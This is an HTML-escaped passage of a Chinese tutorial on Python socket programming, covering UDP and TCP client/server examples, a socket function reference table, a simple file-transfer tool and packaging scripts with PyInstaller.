-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131212555640.png&#34; alt=&#34;image-20230131212555640&#34; /&gt;&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;客户端送一个 SYN 包作为建立连接的请求等待确认应答。&lt;/li&gt;
-&lt;li&gt;服务器接收到请求数据包后，发送 ACK 确认应答，发送 SYN 包请求连接。&lt;/li&gt;
-&lt;li&gt;客户端针对 SYN 包发送 ACK 包确认应答。&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id=&#34;网络层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络层&#34;&gt;#&lt;/a&gt; 网络层&lt;/h3&gt;
-&lt;p&gt;ip 运行与互联网，是网络互联的重要基础，通过 ip 地址来标识网络上的主机，在公开网络上或者局域网内部，必须使用不同的 ip 地址&lt;/p&gt;
-&lt;p&gt;由于网络地址转换（NAT）和代理服务器等技术的广泛应用，不同内网之间的主机可以使用相同的公网 ip 地址。IP 地址与端口来共同标识网络上特定应用程序，俗称 Socket&lt;/p&gt;
-&lt;h3 id=&#34;网络接口层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络接口层&#34;&gt;#&lt;/a&gt; 网络接口层&lt;/h3&gt;
-&lt;p&gt;MAC 地址也称为网卡物理地址，具有唯一性，是一个 48 为的 2 进制&lt;/p&gt;
-&lt;h2 id=&#34;socket使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#socket使用&#34;&gt;#&lt;/a&gt; Socket 使用&lt;/h2&gt;
-&lt;h3 id=&#34;socket的编程简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#socket的编程简介&#34;&gt;#&lt;/a&gt; Socket 的编程简介&lt;/h3&gt;
-&lt;p&gt;套接字 (Socket) 是计算机之间进行通信的一种约定。通过 Socket，一台计算机可以接收其他计算机的数据，也可以向其他计算机发送数据&lt;/p&gt;
-&lt;p&gt;市面上多数的远程管理软件，大多数依赖 Socket 来实现特定功能的，其包括两个部分：运行在客户端的称为 ClientSocket，运行在服务端的称为 ServerSocket，其实现通信的过程如下所示：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;服务端先初始化 Socket，然后与端口绑定（bind），对端口进行监听（listen），等待客户端连接。&lt;/li&gt;
-&lt;li&gt;客户端初始化一个 Socket，客户端的套接字必须首先指出服务端套接字的地址和端口号，然后向服务器端套接字提出连接请求（connect）。&lt;/li&gt;
-&lt;li&gt;当服务器端套接字接受到客户端套接字的连接请求，响应客户端套戒字的请求，建立一个新的线程，把服务器端套接字的描述发给客户端，一旦客户端确认了此描述，由此连接成功&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131215351633.png&#34; alt=&#34;image-20230131215351633&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;udp编程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#udp编程&#34;&gt;#&lt;/a&gt; UDP 编程&lt;/h3&gt;
-&lt;p&gt;UDP 属于无连接协议，编程的时候不需要建立连接，而是直接向接收方发送信息。UDP 不提供应答重传机制，无法保证数据一定能够到达目的地，下面是三种 UDP 编程常用的 socket 模块方法&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;socket (family [,type [,proto]])：创建一个 Socket 对象，family 为 socket.AF_INET 表示使用 IPV4，socket.AF_INET6 表示使用 IPV6；type 为 SOCK_STREAM 表示使用 TCP，SOCK_DGRAM 表示使用 UDP&lt;/li&gt;
-&lt;li&gt;sendto (string,address)：把 string 指定的内容发送给 adress 指定的地址（这里的 adress 是指 ip + 端口号）&lt;/li&gt;
-&lt;li&gt;recvfrom (bufsize [,flags])：接受数据&lt;/li&gt;
-&lt;/ol&gt;
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#server
-import socket
-
-s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)#调用socket函数初始化
-#print(s)
-s.bind((&amp;quot;&amp;quot;,8001)) #指定IP和端口
-while True:
-    data,addr=s.recvfrom(1024)#不断的接收数据
-    print(data.decode())
-    if data.decode==&#39;exit&#39;:
-        break
-s.close()
-&lt;/code&gt;&lt;/pre&gt;
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#client
-import socket
-import uuid
-import sys
-
-s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-
-def get_mac_adress():
-    mac=uuid.UUID(int=uuid.getnode()).hex[-12:]
-    return &amp;quot;:&amp;quot;.join([mac[e:e+2] for e in range(0,11,2)])
-
-ip=socket.gethostbyname(socket.gethostname())
-#print(&amp;quot;ip的值：&amp;quot;,ip)
-mac=get_mac_adress()
-#print(&amp;quot;mac的值&amp;quot;,mac)
-info=&amp;quot;ip addr:&amp;quot;+ip+&amp;quot;\n&amp;quot;+&amp;quot;mac addr:&amp;quot;+mac
-#print(info)
-s.sendto(info.encode(),(&amp;quot;127.0.0.1&amp;quot;,8001))
-s.sendto(sys.argv[1].encode(),(&amp;quot;127.0.0.1&amp;quot;,8001))
-s.close()
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230201195704235.png&#34; alt=&#34;image-20230201195704235&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;tcp编程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tcp编程&#34;&gt;#&lt;/a&gt; TCP 编程&lt;/h3&gt;
-&lt;p&gt;通常用于可靠的数据传输场合，TCP 通常使用的 socket 模块如下：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;socket (family [,type [,proto]]): 创建一个 Socket 对象，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1maWFtaWx5c29ja2V0LW9vMXUuQUY=&#34;&gt;fiamily 为 socket.AF&lt;/span&gt; INET 表示使用 IPV4，socket.AF_INET6 表示使用 IPV6; type 为 SOCK STREAM 表示使用 TCP，SOCK DGRAM 表示使用 UDP。&lt;/li&gt;
-&lt;li&gt;connect (address): 连接远程主机:&lt;/li&gt;
-&lt;li&gt;send (bytes [,flags]): 发送数据:&lt;/li&gt;
-&lt;li&gt;recv (bufsizelflags]): 接收数据:&lt;/li&gt;
-&lt;li&gt;bind (address): 绑定地址:&lt;/li&gt;
-&lt;li&gt;listen (backlog): 开始监听，等待客户端连接，blacklog 排队数，backlog+1 表示允许的最大连接数:&lt;/li&gt;
-&lt;li&gt;accept (): 响应客户端的请求，接收一个连接&lt;/li&gt;
-&lt;/ul&gt;
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#Server
-import socket
-
-s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.bind((&amp;quot;&amp;quot;,8001))
-s.listen(1)
-print(&amp;quot;Listen at port: 8001&amp;quot;)
-
-conn,addr = s.accept()
-print(conn)
-print(addr)
-
-while True:
-    data = conn.recv(1024)
-    data = data.decode()
-    print(&#39;Recv: &#39;,data)
-    c = input (&#39;Input:&#39;)
-    conn.sendall(c.encode())
-    if c.lower()==&#39;bye&#39;:
-        break
-
-conn.close()
-s.close()
-&lt;/code&gt;&lt;/pre&gt;
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#Client
-import socket
-
-s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-
-try:
-    s.connect((&#39;127.0.0.1&#39;,8001))
-except Exception as q:
-    print(&amp;quot;Error!!!&amp;quot;)
-
-while True:
-    c = input(&amp;quot;input: &amp;quot;)
-    s.sendall(c.encode())
-    data = s.recv(1024).decode()
-    print(&#39;Recv:&#39;,data)
-    if c.lower() == &#39;bye&#39;:
-        break
-
-s.close()
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230201202218353.png&#34; alt=&#34;image-20230201202218353&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230201202227841.png&#34; alt=&#34;image-20230201202227841&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;扩展&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#扩展&#34;&gt;#&lt;/a&gt; 扩展&lt;/h3&gt;
-&lt;p&gt;下表还列举了一些常用函数&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th style=&#34;text-align:left&#34;&gt;函数&lt;/th&gt;
-&lt;th style=&#34;text-align:left&#34;&gt;描述&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;服务器端套接字&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;s.bind()&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;绑定地址（host,port）到套接字， 在 AF_INET 下，以元组（host,port）的形式表示地址。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;s.listen()&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;开始 TCP 监听。backlog 指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为 1，大部分应用程序设为 5 就可以了。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;s.accept()&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;被动接受 TCP 客户端连接，(阻塞式) 等待连接的到来&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;客户端套接字&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;s.connect()&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;主动初始化 TCP 服务器连接，。一般 address 的格式为元组（hostname,port），如果连接出错，返回 socket.error 错误。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;s.connect_ex()&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;connect () 函数的扩展版本，出错时返回出错码，而不是抛出异常&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;公共用途的套接字函数&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;s.recv()&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;接收 TCP 数据，数据以字符串形式返回，bufsize 指定要接收的最大数据量。flag 提供有关消息的其他信息，通常可以忽略。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;s.send()&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;发送 TCP 数据，将 string 中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于 string 的字节大小。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;s.sendall()&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;完整发送 TCP 数据。将 string 中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回 None，失败则抛出异常。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;s.recvfrom()&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;接收 UDP 数据，与 recv () 类似，但返回值是（data,address）。其中 data 是包含接收数据的字符串，address 是发送数据的套接字地址。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;s.sendto()&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;发送 UDP 数据，将数据发送到套接字，address 是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;s.close()&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;关闭套接字&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;s.getpeername()&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;返回连接套接字的远程地址。返回值通常是元组（ipaddr,port）。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;s.getsockname()&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;返回套接字自己的地址。通常是一个元组 (ipaddr,port)&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;s.setsockopt(level,optname,value)&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;设置给定套接字选项的值。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;s.getsockopt(level,optname[.buflen])&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;返回套接字选项的值。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;s.settimeout(timeout)&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;设置套接字操作的超时期，timeout 是一个浮点数，单位是秒。值为 None 表示没有超时期。一般，超时期应该在刚创建套接字时设置，因为它们可能用于连接的操作（如 connect ()）&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;s.gettimeout()&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;返回当前超时期的值，单位是秒，如果没有设置超时期，则返回 None。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;s.fileno()&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;返回套接字的文件描述符。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;s.setblocking(flag)&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;如果 flag 为 0，则将套接字设为非阻塞模式，否则将套接字设为阻塞模式（默认值）。非阻塞模式下，如果调用 recv () 没有发现任何数据，或 send () 调用无法立即发送数据，那么将引起 socket.error 异常。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;s.makefile()&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;创建一个与该套接字相关连的文件&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;h2 id=&#34;socket文件传输&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#socket文件传输&#34;&gt;#&lt;/a&gt; Socket 文件传输&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#Server
-
-import socketserver
-import struct
-import os
-import re
-import json
-import struct
-from optparse import OptionParser
-
-def sendFile(conn, head_info,head_info_len,filename):
-    try:
-        conn.send(head_info_len)
-        conn.send(head_info.encode(&#39;utf-8&#39;))
-        with open(filename, &#39;rb&#39;) as f:
-            conn.sendall(f.read())
-        print(&#39;[+]send success! &#39;+filename)
-    except:
-        print(&#39;[-]send fail! &#39; + filename)
-
-def operafile(filename):
-    filesize_bytes = os.path.getsize(filename)
-    pattern = re.compile(r&#39;([^&amp;lt;&amp;gt;/\\\|:&amp;quot;&amp;quot;\*\?]+\.\w+$)&#39;)
-    data = pattern.findall(filename)
-    head_dir = &amp;#123;
-        &#39;filename&#39;: data,
-        &#39;filesize_bytes&#39;: filesize_bytes,
-    &amp;#125;
-    head_info = json.dumps(head_dir)
-    head_info_len = struct.pack(&#39;i&#39;, len(head_info))
-    return head_info_len, head_info
-
-class MyServer(socketserver.BaseRequestHandler):
-    buffsize = 1024
-    def handle(self):
-        print(&#39;[+]远程客户端ip地址：&#39;, self.client_address[0],&#39;\n&#39;)
-        while True:
-            filename = input(&#39;请输入要发送的文件名&amp;gt;&amp;gt;&amp;gt;&#39;).strip() #移除字符串头尾指定的字符（默认为空格或换行符）或字符序列
-            if(filename == &amp;quot;exit&amp;quot;):
-                break
-            head_info_len, head_info = operafile(filename)
-            sendFile(self.request,head_info,head_info_len,filename)
-        self.request.close()
-
-def main():
-    parser = OptionParser(&amp;quot;Usage:%prog -p &amp;lt;port&amp;gt; &amp;quot;)   # 输出帮助信息
-    parser.add_option(&#39;-p&#39;,type=&#39;string&#39;,dest=&#39;port&#39;,help=&#39;specify targer port&#39;)   # 获取ip地址参数
-    options,args = parser.parse_args()
-    port = int(options.port)
-
-    print(&amp;quot;[+]listening at &amp;quot; + str(port))
-    s = socketserver.ThreadingTCPServer((&#39;0.0.0.0&#39;, port), MyServer)  #
-    s.serve_forever()
-
-if __name__ == &#39;__main__&#39;:
-    try:
-        main()
-    except KeyboardInterrupt:
-        print(&amp;quot;interrupted by user, killing all threads...&amp;quot;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#client
-
-from socket import *
-import os
-import sys
-import json
-import struct
-from optparse import OptionParser
-
-def recv_file(head_dir, tcp_client):
-    filename = head_dir[&#39;filename&#39;]
-    filesize = head_dir[&#39;filesize_bytes&#39;]
-    print(&amp;quot;[+]filename: &amp;quot;+filename[0])
-    print(&amp;quot;[+]filesize: &amp;quot;+ str(filesize))
-    recv_len = 0
-    f = open(filename[0], &#39;wb&#39;)
-    while recv_len &amp;lt; filesize:
-        if(filesize &amp;gt; 1024):
-            recv_mesg = tcp_client.recv(1024)
-            recv_len += len(recv_mesg)
-            f.write(recv_mesg)
-        else:
-            recv_mesg = tcp_client.recv(filesize)
-            recv_len += len(recv_mesg)
-            f.write(recv_mesg)
-    f.close()
-    print(&#39;[+]文件传输完成!&#39;)
-
-def main():
-    parser = OptionParser(&amp;quot;Usage:%prog -u &amp;lt;target address&amp;gt; -p &amp;lt;port&amp;gt; &amp;quot;)   # 输出帮助信息
-    parser.add_option(&#39;-u&#39;, type=&#39;string&#39;, dest=&#39;ip&#39;, help=&#39;specify targer ip&#39;)  # 获取ip地址参数
-    parser.add_option(&#39;-p&#39;,type=&#39;string&#39;,dest=&#39;port&#39;,help=&#39;specify targer port&#39;)   # 获取ip地址参数
-    options,args = parser.parse_args()
-    target_port = int(options.port)
-    target_ip = options.ip
-
-    tcp_client = socket(AF_INET, SOCK_STREAM)  # socket初始化
-    ip_port = ((target_ip, target_port))
-    tcp_client.connect_ex(ip_port)
-    print(&#39;[+]等待服务端应答数据....&#39;)
-    struct_len = tcp_client.recv(4)  # 接收报头长度
-    struct_info_len = struct.unpack(&#39;i&#39;, struct_len)[0]  # 解析得到报头信息的长度
-    print(&amp;quot;[+]接收头信息长度：&amp;quot; + str(struct_info_len))
-    head_info = tcp_client.recv(struct_info_len)
-    head_dir = json.loads(head_info.decode(&#39;utf-8&#39;))  # 将报头的内容反序列化
-    print(&amp;quot;[+]输出头部信息内容：&amp;quot; + str(head_dir))
-    recv_file(head_dir, tcp_client)
-
-if __name__ == &#39;__main__&#39;:
-    try:
-        main()
-    except KeyboardInterrupt:
-        print(&amp;quot;interrupted by user, killing all threads...&amp;quot;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&#34;可执行文件的转换&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#可执行文件的转换&#34;&gt;#&lt;/a&gt; 可执行文件的转换&lt;/h2&gt;
-&lt;p&gt;当开发者向普通用户分享程序的时候，为了方便用户在未安装 Python 环境的情况下能够正常运行，需要将为开发号的程序进行打包，转换成用户可执行的文件类型&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;PyInstaller&lt;/li&gt;
-&lt;li&gt;Py2exe&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;上面是两种常见的打包工具，PyInstaller 打包的执行文件，只能在与执行打包操作系统的同类型环境下运行&lt;/p&gt;
-&lt;h3 id=&#34;pyinstaller安装&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pyinstaller安装&#34;&gt;#&lt;/a&gt; PyInstaller 安装&lt;/h3&gt;
-&lt;pre&gt;&lt;code&gt;pip install pyinstaller
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;win系统下的转换&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#win系统下的转换&#34;&gt;#&lt;/a&gt; win 系统下的转换&lt;/h3&gt;
-&lt;pre&gt;&lt;code&gt;pyinstaller -F -i ico文件 py文件
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;linux下的转换&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#linux下的转换&#34;&gt;#&lt;/a&gt; Linux 下的转换&lt;/h3&gt;
-&lt;pre&gt;&lt;code&gt;pyinstaller -F py文件
 &lt;/code&gt;&lt;/pre&gt;
  ]]></description>
         </item>
